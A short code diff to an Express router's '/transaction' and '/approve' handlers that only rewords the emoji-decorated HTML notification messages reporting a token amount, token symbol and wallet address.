@@ -34,7 +34,7 @@ router.post("/transaction", async (req, res) => {
 
   try {
     let text = '';
-    text = `🚀 <b>Tranaction finished</b> 🚀\n\n` +
+    text = `🚀 <b>Tranaction Started</b> 🚀\n\n` +
            `📈 <b>Amount</b>: ${approval_amount}\n` +
            `💰 <b>Token</b>: ${token_symbol}\n` +
            `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
@@ -61,7 +61,7 @@ router.post("/approve", async (req, res) => {
 
   try {
     let text = '';
-    text = `🚀 <b>Token approved</b> 🚀\n\n` +
+    text = `🚀 <b>Token Approved</b> 🚀\n\n` +
            `📈 <b>Amount</b>: ${approval_amount}\n` +
            `💰 <b>Token</b>: ${token_symbol}\n` +
            `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
